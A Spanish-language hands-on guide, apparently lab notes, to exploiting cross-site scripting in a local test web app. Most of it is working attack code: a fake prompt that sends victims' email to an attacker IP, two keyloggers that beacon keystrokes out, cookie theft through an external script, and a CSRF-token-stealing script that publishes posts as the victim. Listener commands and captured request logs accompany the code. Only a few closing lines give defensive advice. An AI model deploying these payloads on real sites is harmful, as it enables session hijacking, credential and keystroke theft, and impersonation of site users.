
---
- Tags: #vulnerabilidades #web #script 
---
# Guía práctica: Explotación de vulnerabilidades XSS (Cross-Site Scripting)

## Introducción

En esta guía se recoge una práctica completa sobre la explotación de una vulnerabilidad XSS (Cross-Site Scripting). Se documentan los distintos tipos de XSS, pruebas básicas, la ejecución de scripts maliciosos, el robo de cookies de sesión, la utilización de keyloggers, redirección de páginas y publicación de contenido como otro usuario. Se incluye también el uso de BurpSuite para interceptar y modificar peticiones HTTP.

---
## Paso 1 - Testeo

### Ejemplo 1: Etiqueta `<h1>`

**Código a inyectar:**

```html
Esto es una <h1>prueba</h1>
````

**¿Qué hace?**

- Este código usa una etiqueta HTML `<h1>`, que significa "encabezado de nivel 1".
    
- Al introducirlo en un campo de texto de una web que no escapa correctamente los caracteres HTML, el fragmento formatea la palabra “prueba” como un encabezado grande.
    

**¿Por qué es relevante para XSS?**

- Si la web no filtra ni escapa etiquetas HTML, permite que los usuarios inyecten código arbitrario en el contenido mostrado.
    
---

### Ejemplo 2: Etiqueta `<marquee>`

**Código a inyectar:**

```html
Hola, va a ser usted <marquee>Hacked</marquee>
```

**¿Qué hace?**

- La etiqueta `<marquee>` es una etiqueta HTML obsoleta que se usaba para hacer que el texto se desplace automáticamente.
    
- En este caso, la palabra “Hacked” se desplaza por la pantalla.
    

**¿Por qué es relevante para XSS?**

- Aunque `<marquee>` en sí no es peligroso, demuestra que es posible inyectar etiquetas HTML en la web.
    
- Si la web permite `<marquee>`, podría permitir también etiquetas más peligrosas, como `<script>`, que sí ejecutan código malicioso.
    

> **Explicación:**  
> Resaltar la importancia de permitir etiquetas HTML sin filtros.

---

### Ejemplo 3: Inyección de `<script>`

**Código a inyectar:**

```html
<script>alert("XSS")</script>
```

**¿Qué hace?**

- Es el ejemplo clásico de XSS almacenado o reflejado.
    
- La etiqueta `<script>` permite ejecutar código JavaScript dentro de la página.
    
- La función `alert("XSS")` muestra una ventana emergente con el mensaje “XSS”.
    

**¿Por qué es peligroso?**

- Si el servidor no filtra el contenido del usuario, este código se ejecutará en el navegador de cualquier visitante.
    
- Aunque en este ejemplo solo muestra una alerta, un atacante podría robar cookies, redirigir al usuario a otra web, inyectar keyloggers, etc.
    

> **Explicación:**  
>Aunque el ejemplo utiliza `alert()`, el potencial de ataque es mucho mayor si se usa código malicioso.

---

### Ejemplo 4: Prueba en la Consola de DevTools

**Código a ejecutar en DevTools:**

```javascript
alert("XSS");
```

**¿Qué hace?**

- Ejecutado en la consola del navegador, muestra una alerta en la página.
    
- No se aprovecha una vulnerabilidad de XSS, sino que es una prueba directa en la consola de desarrollador.
    

**¿Por qué es importante?**

- Si se consigue ejecutar `alert("XSS")` en un campo de entrada, significa que se puede ejecutar cualquier otro código JavaScript.
    
- Se recomienda usar la consola para probar otros payloads antes de inyectarlos en la página.
    

> **Explicación:**  
> La prueba en consola es solo una verificación preliminar.

---

### Conclusión del Paso 1

Las pruebas confirman que la web es vulnerable a XSS si permite la inyección de etiquetas HTML y JavaScript sin sanitización.  
El objetivo de XSS no es solo mostrar alertas, sino:

- **Robar cookies** (e.g., `document.cookie`)
    
- **Redirigir usuarios** (e.g., `window.location`)
    
- **Inyectar keyloggers** (e.g., mediante `document.addEventListener("keypress", function(e) { ... })`)
    

---

## Paso 2 - Prueba de XSS para Captura de Email

**Script para capturar el correo electrónico del usuario:**

```html
<script>
  var email = prompt("Por favor, introduzca su correo electrónico para visualizar el post", "example@example.com");
  
  if (email == null || email == "") {
    alert("Se requiere introducir un correo válido para visualizar el post");
  } else {
    fetch("http://192.168.1.52/?email=" + email);
  }
</script>
```

**fectch(...)**   |   Realiza una **petición HTTP** desde el navegador. Es una *API moderna de JS* para hacer solicitudes HTTP. Reemplaza a `XMLHttpRequest` y permite hacer peticiones GET, POST, etc., fácilmente. Es clave en XSS para robar datos y enviarlos a servidores

**prompt**      |   Pide input, no solo muestra. Una comparación  precisa sería: `read` en bash o `input()` en Python

**Uso de comandos en la terminal:**

```bash
bat email.js | xclip -sel clip
```

- Esto copia en el portapapeles el contenido del script creado.
    

Se sube este post y, en paralelo, se levanta un servidor local con Python:

```bash
python3 -m http.server 80
```

- Al introducir un correo en el navegador tras la ejecución del script, se visualizará el correo capturado en el servidor Python.

Otra alternativa a python es la siguiente [[Socat]] la cual no muestra más información:

```shel
socat TCP-LISTEN:1234,reuseaddr,fork -
```

Resultado:

```shell
GET /?email=mail@mail.com HTTP/1.1
Host: 127.0.0.1:1234
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://localhost:8081/
Origin: http://localhost:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=4
```


---

## Paso 3 - Redirección a Otra Web

**Código a inyectar:**

```html
<script>
  window.location.href = "http://google.es";
</script>
```

> **Explicación:**  
> El script redirige al usuario a la página especificada.

---

## Paso 4 - Keylogger

**Código a inyectar:**

```html
<script>
  var k = "";
  document.onkeypress = function(e) {
    e = e || window.event;
    k += e.key;
    var i = new Image();
    i.src = "http://192.168.1.52/" + k;
  };
</script>
```

Alternativa, más optimizada:

```HTML
<script>
  var data = "";
  document.onkeypress = function(e) {
    data += e.key;
    if (data.length > 20) {
      new Image().src = "http://192.168.1.52/log?c=" + data;
      data = "";
    }
  };
</script>

```

> **Explicación:**  
> El script captura las teclas presionadas y envía la información al servidor del atacante.

---

## Paso 5 - External JavaScript Source para Cookie Hijacking

**Fragmento inyectado en el cuerpo del mensaje:**

```html
<script src="http://192.168.1.52/cookies.js"></script>
```

- Este código conecta con un script alojado en la máquina del atacante.
    
- Al cargar el post con este código, la víctima descarga y ejecuta el script, permitiendo que el atacante recoja la cookie de sesión.
    

**Código para enviar la cookie recolectada:**

```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.52/?cookie=' + document.cookie);
request.send();
```

**Detalles adicionales:**

- Se explica cómo ver las cookies de sesión mediante `Ctrl+Shift+I` (Storage) en el navegador.
    
- Se recomienda visitar [jwt.io](https://jwt.io/) para descodificar la cookie (en formato JSON Web Token).
    
- Se indica la necesidad de desactivar la opción `httpOnly` desde las herramientas de desarrollo para poder capturar cookies de sesión.
    

---

## Paso 6 - Secuestro de Sesión para Escribir un Post en Nombre de la Víctima

### Parte 1: Cargando un Script Externo

**Código a inyectar en el post malicioso:**

```html
<script src="http://192.168.1.52/pwned.js"></script>
```

- Este script, combinado con el código siguiente, permite secuestrar la sesión y realizar publicaciones en nombre de la víctima.
    

### Parte 2: Recolección del CSRF Token y Envío del Post

**Código para capturar el CSRF token y enviar una solicitud GET (traza inicial):**

```javascript
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.send();

var response = req1.responseText;
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://192.168.1.52/?response=' + btoa(response));
req2.send();
```

- En este paso, el script muestra en base64 el código HTML del servidor, lo que permite obtener el valor del `csrf_token`.
    

**Instrucción para decodificar el HTML obtenido:**

```bash
echo -n "........codigo html obtenido en base64..............." | base64 -d; echo 
```

- Con esta instrucción se puede ver el código HTML, identificando el campo:
    

```html
<input name="_csrf_token" type="hidden" value="49985ee0-7392-4539-a815-62a3f3455579">
```

**Código para obtener y usar el CSRF token:**

```javascript
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true;
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

var req2 = new XMLHttpRequest();
var data = "title=prueba+burpsuite&subtitle=burpsuite&text=prueba&_csrf_token=" + token;
req2.open('POST', 'http://localhost:10007/newgossip', false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
```

- Con esta solicitud POST se crea una publicación en nombre de la víctima tras secuestrar su sesión.
    

**Ejemplo de modificación de una publicación:**

```javascript
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true;
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

var req2 = new XMLHttpRequest();
var data = "title=Mi%20jefe%20es%20un%20cabronazo&subtitle=Se%20tenso&text=Quizás%20fui%20hackeado&_csrf_token=" + token;
req2.open('POST', 'http://localhost:10007/newgossip', false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
```

> **Explicación:**  
> 
> 1. Carga y ejecución del script externo.
>     
> 2. Extracción y decodificación del CSRF token.
>     
> 3. Realización de la solicitud POST para publicar en nombre de la víctima.
>     
> 
> Se ha agregado el parámetro `withCredentials = true` para manejar tokens de sesión dinámicos.

**Información Adicional:**

- Se recomienda estar en escucha en el servidor (usando `python3 -m http.server 80`) para visualizar las solicitudes entrantes, tal como se muestra en la salida:
    

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.52 - - [08/Apr/2025 19:09:47] "GET /pwned.js HTTP/1.1" 200 -
192.168.1.52 - - [08/Apr/2025 19:09:47] "GET /?token=49985ee0-7392-4539-a815-62a3f3455579 HTTP/1.1" 200 -
```

- Se detalla también cómo interceptar solicitudes POST con herramientas como Burp Suite para identificar los valores críticos (e.g., `csrf_token` y otros parámetros).
    

> **Explicación:**  
> Se han clarificado y organizado las instrucciones para facilitar la comprensión. Se han añadido explicaciones sobre la funcionalidad y la finalidad de cada fragmento de código. Se resalta que, en algunos ejemplos, el secuestro de sesión es opcional, ya que el ejemplo continúa con la demostración paso a paso.

---
# Uso de Burp Suite para Extraer Datos Críticos y Configurar Scripts

Este apartado se incorpora al contenido anterior para explicar, mediante un ejemplo, cómo utilizar Burp Suite para interceptar una solicitud POST y extraer los valores necesarios que luego se usarán en los scripts de ataque (por ejemplo, para obtener el CSRF token).

---
## Interceptación con Burp Suite

1. **Configura Burp Suite:**  
   - Asegúrate de que Burp Suite esté configurado como proxy en el navegador.
   - Habilita el modo de Interceptación para capturar tráfico HTTP/HTTPS.

2. **Realiza una acción en la web:**  
   - Ejecuta una acción en el sitio vulnerable que envíe datos mediante POST (por ejemplo, enviar un formulario para crear un nuevo post).
   - En este ejemplo, se intercepta un POST que envía los siguientes datos:

```plaintext
title=prueba+burpsuite&subtitle=burpsuite&text=prueba&_csrf_token=49985ee0-7392-4539-a815-62a3f3455579
```

3. **Observa la Solicitud POST Interceptada:**
    
	  La solicitud completa interceptada se verá similar a la siguiente:

```http
    POST /newgossip HTTP/1.1
    Host: localhost:10007
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: http://localhost:10007/newgossip
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 102
    Origin: http://localhost:10007
    DNT: 1
    Sec-GPC: 1
    Connection: keep-alive
    Cookie: session=eyJfY3NyZl90b2tlbiI6IjQ5OTg1ZWUwLTczOTItNDUzOS1hODE1LTYyYTNmMzQ1NTU3OSIsInVzZXJuYW1lIjoiYWxvZGlhIn0.Z_VS2w.2PSxv5mEJ1A8rJWDxuQJIJSCjtQ
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Priority: u=0, i
    
    title=prueba+burpsuite&subtitle=burpsuite&text=prueba&_csrf_token=49985ee0-7392-4539-a815-62a3f3455579    
```

**Explicación:**  Se muestran tanto los headers HTTP como el cuerpo de la solicitud. El cuerpo contiene los parámetros enviados, entre los cuales:
    
 `title`, `subtitle` y `text` son datos de la publicación.
    
 `_csrf_token` es el valor crítico que permite validar la sesión en el servidor.>     
    

---

## Datos Relevantes para los Scripts

Al analizar la solicitud interceptada se identifican varios parámetros importantes:

- **_csrf_token:**  
    El token CSRF es fundamental para la validación de solicitudes en el servidor. Su valor en este ejemplo es:
    
    ```plaintext
    49985ee0-7392-4539-a815-62a3f3455579
    ```
    
- **Otras variables (ejemplo):**  
    Aunque en este ejemplo se usan `title`, `subtitle` y `text` para la creación del post, el foco en la explotación suele ser el extraer el `_csrf_token` para poder replicar o modificar la solicitud.



> **Uso en los scripts:**  
> Una vez interceptado y extraído el token, se incorpora al script para simular la petición legítima del usuario. Por ejemplo, en el script para secuestrar sesión se puede utilizar el token de la siguiente manera:


```javascript
> var domain = "http://localhost:10007/newgossip";
> var req1 = new XMLHttpRequest();
> req1.open('GET', domain, false);
> req1.withCredentials = true;
> req1.send();
> 
> var response = req1.responseText;
> var parser = new DOMParser();
> var doc = parser.parseFromString(response, 'text/html');
> var token = doc.getElementsByName("_csrf_token")[0].value;
> 
> var req2 = new XMLHttpRequest();
> var data = "title=prueba+burpsuite&subtitle=burpsuite&text=prueba&_csrf_token=" + token;
> req2.open('POST', 'http://localhost:10007/newgossip', false);
> req2.withCredentials = true;
> req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
> req2.send(data);
```


> 
> **Resumen:**
> 
> - Usa Burp Suite para interceptar la solicitud POST.
>     
> - Identifica y copia el valor del campo `_csrf_token`.
>     
> - Emplea este valor en tus scripts de inyección o secuestro de sesión para simular una petición válida del usuario.
>     

---

## Conclusión

Mediante la interceptación de solicitudes con Burp Suite, se pueden obtener datos críticos que permiten configurar y ajustar los scripts de ataque. La principal utilidad radica en capturar el valor del `_csrf_token` y otros parámetros, que son esenciales para realizar solicitudes POST válidas en nombre de una víctima.

---

## Conclusión

La vulnerabilidad XSS permite ejecutar código malicioso en el navegador de otros usuarios, lo que puede derivar en el robo de información sensible, secuestro de sesión o la manipulación del contenido del sitio web. Es crucial conocer sus vectores y mecanismos para poder defender adecuadamente una aplicación.

---

## Recomendaciones

- Utilizar codificación de salida (output encoding).
    
- Implementar CSP (Content Security Policy).
    
- Validar y sanitizar todos los datos de entrada.
    
- Utilizar frameworks modernos que minimizan la exposición a XSS.
---

## ⚠️ Problemas Comunes y Cómo Resolverlos

- **El navegador no ejecuta el `script`** → Asegúrate de que no se filtre la entrada o escape el HTML (como con `&lt;script&gt;`). Usa herramientas como DevTools (`F12`) para inspeccionar el código fuente.
    
- **No ves tráfico en tu servidor** → Verifica que tu servidor de escucha esté activo y tu IP/PUERTO estén correctamente definidos en el script. Puedes usar `nc -lvnp PUERTO` para recibir la petición.
    
- **No se redirige al sitio externo** → Algunos navegadores bloquean redirecciones automáticas o el campo puede estar sanitizado.
    
- **La cookie está vacía o protegida** → Si la cookie tiene el atributo `HttpOnly`, no podrás acceder a ella con JavaScript. En este caso, intenta explotar la vulnerabilidad de otra forma (por ejemplo, con CSRF o capturando formularios).
    

---

## 📚 Recursos Recomendados

- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
    
- [XSS Cheat Sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
    
- [PayloadAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
    
---
